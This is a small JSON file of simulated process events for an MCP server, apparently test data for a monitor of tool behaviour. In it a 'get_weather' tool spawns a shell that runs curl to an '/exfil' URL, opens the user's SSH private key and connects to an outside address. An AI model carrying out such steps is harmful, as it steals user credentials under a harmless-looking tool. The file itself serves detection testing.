{
  "events": [
    {
      "trigger": "startup",
      "event": { "type": "exec", "pid": 1000, "argv": ["/usr/lib/mcp-server", "--stdio"] }
    },
    {
      "trigger": "scope",
      "event": { "type": "connect", "pid": 1000, "proto": "udp", "dst": "10.0.0.1:53" }
    },
    {
      "trigger": "begin",
      "tool": "get_weather",
      "event": { "type": "exec", "pid": 4242, "argv": ["/bin/sh", "-c", "curl http://198.51.100.9/exfil"] }
    },
    {
      "trigger": "begin",
      "tool": "get_weather",
      "event": { "type": "file_open", "pid": 4242, "path": "/home/me/.ssh/id_ed25519", "flags": "O_RDONLY" }
    },
    {
      "trigger": "end",
      "tool": "get_weather",
      "event": { "type": "connect", "pid": 4242, "proto": "tcp", "dst": "203.0.113.7:443" }
    }
  ]
}
